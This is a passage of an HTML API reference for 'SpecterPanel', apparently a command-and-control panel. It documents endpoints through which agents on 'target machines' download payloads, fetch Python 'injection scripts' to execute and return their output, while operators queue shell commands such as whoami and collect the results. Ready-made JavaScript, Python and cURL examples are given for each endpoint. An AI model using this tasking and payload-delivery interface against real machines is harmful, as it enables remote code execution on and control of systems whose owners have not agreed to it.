              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_lib-js" class="code">// JavaScript (fetch)
// Note: GET with body may not be supported by all browsers/servers
fetch('http://SERVER/api/lib/example_payload', {
  method: 'GET',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    token: 'ABC123',
    ip: '10.0.0.2',
    os: 'linux'
  })
})
.then(response => response.text())
.then(text => console.log('File content:', text))
.catch(error => console.error('Error:', error));</pre>

        <pre id="api_lib-py" class="code" style="display:none"># Python (requests)
import requests

payload = {
    'token': 'ABC123',
    'ip': '10.0.0.2',
    'os': 'linux'
}

try:
    # Note: GET with body is non-standard but works with requests
    response = requests.get(
        'http://SERVER/api/lib/example_payload',
        json=payload
    )
    print("File content:", response.text)
except Exception as e:
    print("Error:", e)</pre>

        <pre id="api_lib-curl" class="code" style="display:none"># cURL
curl -X GET "http://SERVER/api/lib/example_payload" \
  -H "Content-Type: application/json" \
  -d '{"token":"ABC123","ip":"10.0.0.2","os":"linux"}'</pre>
      </section>

      <!-- API: /api/injection/<target_name> -->
      <section id="api_injection">
        <div class="meta">
          <span class="method-badge">GET/POST</span>
          <h2 class="endpoint-path">/api/injection/&lt;target_name&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve or submit Python injection scripts. GET requests fetch the current injection script, while POST requests submit execution results.</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>token</td>
            <td>string</td>
            <td>query (GET) / body (POST)</td>
            <td><span class="required">*</span></td>
            <td>API token for authentication</td>
          </tr>
          <tr>
            <td>ip</td>
            <td>string</td>
            <td>query/body</td>
            <td></td>
            <td>Agent's IP address (optional)</td>
          </tr>
          <tr>
            <td>os</td>
            <td>string</td>
            <td>query/body</td>
            <td></td>
            <td>Agent's operating system (optional)</td>
          </tr>
          <tr>
            <td>code_output</td>
            <td>string</td>
            <td>body (POST only)</td>
            <td>POST: <span class="required">*</span></td>
            <td>Output from executed injection script (POST only)</td>
          </tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>Unique identifier for the target machine</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> GET Success - Returns injection script</div>
            <pre class="code">{ "script": "print('Hello from injection')" }</pre>
          </div>
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> POST Success - Output saved</div>
            <pre class="code">{ "message": "Injection output saved" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="api_injection-js">JavaScript</button>
            <button class="tab-btn" data-target="api_injection-py">Python</button>
            <button class="tab-btn" data-target="api_injection-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="api_injection-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="api_injection-js" class="code">// JavaScript (fetch) - GET script
fetch('http://SERVER/api/injection/demo_target?token=ABC123')
  .then(response => response.json())
  .then(data => console.log('Injection script:', data.script))
  .catch(error => console.error('Error:', error));

// JavaScript (fetch) - POST output
fetch('http://SERVER/api/injection/demo_target', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    token: 'ABC123',
    code_output: 'Injection completed successfully'
  })
})
.then(response => response.json())
.then(data => console.log('Server response:', data))
.catch(error => console.error('Error:', error));</pre>

        <pre id="api_injection-py" class="code" style="display:none"># Python (requests) - GET script
import requests

try:
    response = requests.get(
        'http://SERVER/api/injection/demo_target',
        params={'token': 'ABC123'}
    )
    print("Injection script:", response.json().get('script'))
except Exception as e:
    print("Error:", e)

# Python (requests) - POST output
output_data = {
    'token': 'ABC123',
    'code_output': 'Injection completed successfully'
}

try:
    response = requests.post(
        'http://SERVER/api/injection/demo_target',
        json=output_data
    )
    print("Server response:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="api_injection-curl" class="code" style="display:none"># cURL - GET script
curl -X GET "http://SERVER/api/injection/demo_target?token=ABC123"

# cURL - POST output
curl -X POST "http://SERVER/api/injection/demo_target" \
  -H "Content-Type: application/json" \
  -d '{"token":"ABC123","code_output":"Injection completed successfully"}'</pre>
      </section>

      <!-- View.py endpoints -->
      <section id="view_api_command">
        <div class="meta">
          <span class="method-badge">GET/POST</span>
          <h2 class="endpoint-path">/api_command/&lt;targetName&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Web interface endpoint for managing commands. GET requests render the web interface, while POST requests add new commands for the specified target.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Parameters (POST JSON)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>input</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Command text to be executed by the target</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> POST Success - Command added</div>
            <pre class="code">{
  "message": "command saved successfully",
  "id": "cmd123",
  "target_name": "demo_target"
}</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_api_command-js">JavaScript</button>
            <button class="tab-btn" data-target="view_api_command-py">Python</button>
            <button class="tab-btn" data-target="view_api_command-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_api_command-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_api_command-js" class="code">// JavaScript (fetch) - requires session cookie
fetch('/api_command/demo_target', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ input: 'whoami' })
})
.then(response => response.json())
.then(data => console.log('Command saved:', data))
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_api_command-py" class="code" style="display:none"># Python (requests) - using session with cookies
import requests

# First authenticate (example)
session = requests.Session()
login_response = session.post('http://SERVER/login', data={
    'username': 'admin',
    'password': 'password'
})

# Then make authenticated request
try:
    response = session.post(
        'http://SERVER/api_command/demo_target',
        json={'input': 'whoami'}
    )
    print("Command saved:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_api_command-curl" class="code" style="display:none"># cURL - requires session cookie
# First login and save cookies (example)
curl -c cookies.txt -X POST "http://SERVER/login" \
  -d "username=admin&password=password"

# Then make authenticated request
curl -b cookies.txt -X POST "http://SERVER/api_command/demo_target" \
  -H "Content-Type: application/json" \
  -d '{"input":"whoami"}'</pre>
      </section>

      <section id="view_check_update">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/check_command_update/&lt;target_name&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Check for updated command outputs from a target. Used by the web interface to poll for new command results.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns updated commands</div>
            <pre class="code">{
  "message": "Commands checked successfully",
  "updated_commands": [
    ["user123", "cmd123"],
    ["Linux hostname", "cmd124"]
  ]
}</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_check_update-js">JavaScript</button>
            <button class="tab-btn" data-target="view_check_update-py">Python</button>
            <button class="tab-btn" data-target="view_check_update-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_check_update-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_check_update-js" class="code">// JavaScript (fetch) - requires session cookie
fetch('/check_command_update/demo_target', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log('Updated commands:', data.updated_commands))
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_check_update-py" class="code" style="display:none"># Python (requests) - using session with cookies
import requests

# Using existing authenticated session
try:
    response = session.get(
        'http://SERVER/check_command_update/demo_target'
    )
    print("Updated commands:", response.json().get('updated_commands'))
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_check_update-curl" class="code" style="display:none"># cURL - requires session cookie
curl -b cookies.txt "http://SERVER/check_command_update/demo_target"</pre>
      </section>

      <section id="view_delete_command">
        <div class="meta">
          <span class="method-badge">POST</span>
          <h2 class="endpoint-path">/api_command/delete</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Delete a command from the system. Note that while the route suggests DELETE method, the implementation expects POST.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Request Body (JSON)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Target associated with the command</td>
          </tr>
          <tr>
            <td>id</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>ID of the command to delete</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Command deleted</div>
            <pre class="code">{ "message": "Command deleted successfully" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_delete_command-js">JavaScript</button>
            <button class="tab-btn" data-target="view_delete_command-py">Python</button>
            <button class="tab-btn" data-target="view_delete_command-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_delete_command-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_delete_command-js" class="code">// JavaScript (fetch) - requires session cookie
fetch('/api_command/delete', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    target_name: 'demo_target',
    id: 'cmd123'
  })
})
.then(response => response.json())
.then(data => console.log('Server response:', data))
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_delete_command-py" class="code" style="display:none"># Python (requests) - using session with cookies
try:
    response = session.post(
        'http://SERVER/api_command/delete',
        json={
            'target_name': 'demo_target',
            'id': 'cmd123'
        }
    )
    print("Server response:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_delete_command-curl" class="code" style="display:none"># cURL - requires session cookie
curl -b cookies.txt -X POST "http://SERVER/api_command/delete" \
  -H "Content-Type: application/json" \
  -d '{"target_name":"demo_target","id":"cmd123"}'</pre>
      </section>

      <section id="view_api_command_api">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api_command/api/&lt;targetName&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Retrieve all commands for a target in API format. Used by the web interface to display commands.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - Returns all commands</div>
            <pre class="code">{
  "allCommand": [
    ["ID", "email", "target_name", "command", "condition", "update"],
    ["cmd123", "admin@example.com", "demo_target", "whoami", "linux", "2023-08-11 12:00:00"],
    ...
  ]
}</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_api_command_api-js">JavaScript</button>
            <button class="tab-btn" data-target="view_api_command_api-py">Python</button>
            <button class="tab-btn" data-target="view_api_command_api-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_api_command_api-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_api_command_api-js" class="code">// JavaScript (fetch) - requires session cookie
fetch('/api_command/api/demo_target', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log('Commands:', data.allCommand))
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_api_command_api-py" class="code" style="display:none"># Python (requests) - using session with cookies
try:
    response = session.get(
        'http://SERVER/api_command/api/demo_target'
    )
    print("Commands:", response.json().get('allCommand'))
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_api_command_api-curl" class="code" style="display:none"># cURL - requires session cookie
curl -b cookies.txt "http://SERVER/api_command/api/demo_target"</pre>
      </section>

      <section id="view_api_link">
        <div class="meta">
          <span class="method-badge">GET/POST</span>
          <h2 class="endpoint-path">/api_link</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Manage API links. GET requests render the web interface, while POST requests create new API links.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login). POST expects form data.</p>
        </div>
        
        <h3>Parameters (POST Form)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Target associated with the API link</td>
          </tr>
          <tr>
            <td>link</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>URL or endpoint for the API link</td>
          </tr>
          <tr>
            <td>action_type</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>HTTP method (GET, POST, etc.)</td>
          </tr>
          <tr>
            <td>condition</td>
            <td>integer</td>
            <td></td>
            <td>Condition for the link (optional)</td>
          </tr>
        </table>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_api_link-js">JavaScript</button>
            <button class="tab-btn" data-target="view_api_link-py">Python</button>
            <button class="tab-btn" data-target="view_api_link-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_api_link-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_api_link-js" class="code">// JavaScript (fetch) - Form POST
const formData = new FormData();
formData.append('target_name', 'demo_target');
formData.append('link', 'http://example.com/api');
formData.append('action_type', 'GET');
formData.append('condition', '1');

fetch('/api_link', {
  method: 'POST',
  credentials: 'include',
  body: formData
})
.then(() => {
  console.log('API link created');
  // Typically would refresh the page or update UI
})
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_api_link-py" class="code" style="display:none"># Python (requests) - Form POST
form_data = {
    'target_name': 'demo_target',
    'link': 'http://example.com/api',
    'action_type': 'GET',
    'condition': '1'
}

try:
    response = session.post(
        'http://SERVER/api_link',
        data=form_data
    )
    print("API link created")
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_api_link-curl" class="code" style="display:none"># cURL - Form POST
curl -b cookies.txt -X POST "http://SERVER/api_link" \
  -F "target_name=demo_target" \
  -F "link=http://example.com/api" \
  -F "action_type=GET" \
  -F "condition=1"</pre>
      </section>

      <section id="view_api_link_delete">
        <div class="meta">
          <span class="method-badge">GET</span>
          <h2 class="endpoint-path">/api_link_delete/&lt;ID&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Delete an API link by its ID.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Parameters</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>ID</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>ID of the API link to delete</td>
          </tr>
        </table>

        <h3>Responses</h3>
        <div class="response">
          <div class="json">
            <div class="hint"><span class="status-code status-200">200</span> Success - API link deleted</div>
            <pre class="code">{ "message": "API link deleted successfully" }</pre>
          </div>
        </div>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_api_link_delete-js">JavaScript</button>
            <button class="tab-btn" data-target="view_api_link_delete-py">Python</button>
            <button class="tab-btn" data-target="view_api_link_delete-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_api_link_delete-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_api_link_delete-js" class="code">// JavaScript (fetch) - requires session cookie
fetch('/api_link_delete/link123', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log('Server response:', data))
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_api_link_delete-py" class="code" style="display:none"># Python (requests) - using session with cookies
try:
    response = session.get(
        'http://SERVER/api_link_delete/link123'
    )
    print("Server response:", response.json())
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_api_link_delete-curl" class="code" style="display:none"># cURL - requires session cookie
curl -b cookies.txt "http://SERVER/api_link_delete/link123"</pre>
      </section>

      <section id="view_api_link_update">
        <div class="meta">
          <span class="method-badge">POST</span>
          <h2 class="endpoint-path">/api_link_update/&lt;ID&gt;</h2>
        </div>
        
        <div class="endpoint-summary">
          <p>Update an existing API link. Expects form data with the updated fields.</p>
          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
        </div>
        
        <h3>Parameters (POST Form)</h3>
        <table>
          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
          <tr>
            <td>target_name</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Target associated with the API link</td>
          </tr>
          <tr>
            <td>link</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Updated URL or endpoint</td>
          </tr>
          <tr>
            <td>action_type</td>
            <td>string</td>
            <td><span class="required">*</span></td>
            <td>Updated HTTP method</td>
          </tr>
          <tr>
            <td>ID</td>
            <td>string</td>
            <td>path</td>
            <td><span class="required">*</span></td>
            <td>ID of the API link to update</td>
          </tr>
        </table>

        <h3>Examples</h3>
        <div class="code-toolbar">
          <div class="tabs">
            <button class="tab-btn active" data-target="view_api_link_update-js">JavaScript</button>
            <button class="tab-btn" data-target="view_api_link_update-py">Python</button>
            <button class="tab-btn" data-target="view_api_link_update-curl">cURL</button>
          </div>
          <button class="copy-btn" data-copy-target="view_api_link_update-js">
            <svg viewBox="0 0 24 24" width="14" height="14">
              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
            </svg>
            Copy
          </button>
        </div>

        <pre id="view_api_link_update-js" class="code">// JavaScript (fetch) - Form POST
const formData = new FormData();
formData.append('target_name', 'demo_target');
formData.append('link', 'http://updated.com/api');
formData.append('action_type', 'POST');

fetch('/api_link_update/link123', {
  method: 'POST',
  credentials: 'include',
  body: formData
})
.then(() => {
  console.log('API link updated');
  // Typically would refresh the page or update UI
})
.catch(error => console.error('Error:', error));</pre>

        <pre id="view_api_link_update-py" class="code" style="display:none"># Python (requests) - Form POST
form_data = {
    'target_name': 'demo_target',
    'link': 'http://updated.com/api',
    'action_type': 'POST'
}

try:
    response = session.post(
        'http://SERVER/api_link_update/link123',
        data=form_data
    )
    print("API link updated")
except Exception as e:
    print("Error:", e)</pre>

        <pre id="view_api_link_update-curl" class="code" style="display:none"># cURL - Form POST
curl -b cookies.txt -X POST "http://SERVER/api_link_update/link123" \
  -F "target_name=demo_target" \
  -F "link=http://updated.com/api" \
  -F "action_type=POST"</pre>
      </section>

      <footer style="color:var(--muted);font-size:14px;margin-top:40px;padding-top:20px;border-top:1px solid var(--glass)">
        <p>Generated for <strong>SpecterPanel</strong>. Replace <code>SERVER</code> with your server's base URL (e.g., <code>https://panel.example.com</code>).</p>
        <p class="hint">Always handle API tokens securely and never expose them in client-side code.</p>
      </footer>
    </main>
  </div>
  
  <button class="scroll-top" id="scrollTopBtn" aria-label="Scroll to top">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M7 11L12 6L17 11M7 17L12 12L17 17" stroke="#7bd389" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </button>

  <script>
    // Mobile menu toggle
    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
    const sidebar = document.getElementById('sidebar');
    
    mobileMenuBtn.addEventListener('click', () => {
      sidebar.classList.toggle('open');
    });
    
    // Scroll to top button
    const scrollTopBtn = document.getElementById('scrollTopBtn');
    
    window.addEventListener('scroll', () => {
      if (window.pageYOffset > 300) {
        scrollTopBtn.classList.add('visible');
      } else {
        scrollTopBtn.classList.remove('visible');
      }
    });
    
    scrollTopBtn.addEventListener('click', () => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
    
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const parent = btn.closest('section');
        const target = btn.dataset.target;
        
        // Deactivate sibling buttons in same section
        parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        // Hide all code blocks in section, then show the selected one
        parent.querySelectorAll('pre.code').forEach(pre => pre.style.display = 'none');
        const el = parent.querySelector('#' + target);
        if (el) el.style.display = 'block';
      });
    });
    
    // Copy button functionality
    document.querySelectorAll('.copy-btn').forEach(cb => {
      cb.addEventListener('click', () => {
        const targetId = cb.dataset.copyTarget;
        const el = document.getElementById(targetId);
        if (!el) return;
        
        navigator.clipboard.writeText(el.innerText).then(() => {
          const originalText = cb.innerHTML;
          cb.innerHTML = '<svg viewBox="0 0 24 24" width="14" height="14"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" fill="#7bd389"/></svg> Copied!';
          
          setTimeout(() => {
            cb.innerHTML = originalText;
          }, 2000);
        }).catch(() => {
          alert('Copy failed. Please try again or copy manually.');
        });
      });
    });
    
    // Search functionality
    const searchInput = document.getElementById('searchInput');
    const navLinks = document.querySelectorAll('.nav-link');
    
    searchInput.addEventListener('input', (e) => {
      const searchTerm = e.target.value.toLowerCase();
      
      navLinks.forEach(link => {
        const text = link.textContent.toLowerCase();
        if (text.includes(searchTerm)) {
          link.style.display = 'block';
        } else {
          link.style.display = 'none';
        }
      });
    });
    
    // Highlight active nav link based on scroll position
    const sections = document.querySelectorAll('section');
    const navLinksArray = Array.from(document.querySelectorAll('.nav-link'));
    
    window.addEventListener('scroll', () => {
      let current = '';
      
      sections.forEach(section => {
        const sectionTop = section.offsetTop;
        const sectionHeight = section.clientHeight;
        
        if (pageYOffset >= sectionTop - 100) {
          current = section.getAttribute('id');
        }
      });
      
      navLinksArray.forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('href') === `#${current}`) {
          link.classList.add('active');
        }
      });
    });

    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener('click', function(e) {
        e.preventDefault();
        
        const targetId = this.getAttribute('href');
        const targetElement = document.querySelector(targetId);
        
        if (targetElement) {
          window.scrollTo({
            top: targetElement.offsetTop - 80,
            behavior: 'smooth'
          });
          
          // Update URL without jumping
          if (history.pushState) {
            history.pushState(null, null, targetId);
          } else {
            location.hash = targetId;
          }
        }
      });
    });
  </script>
</body>
</html>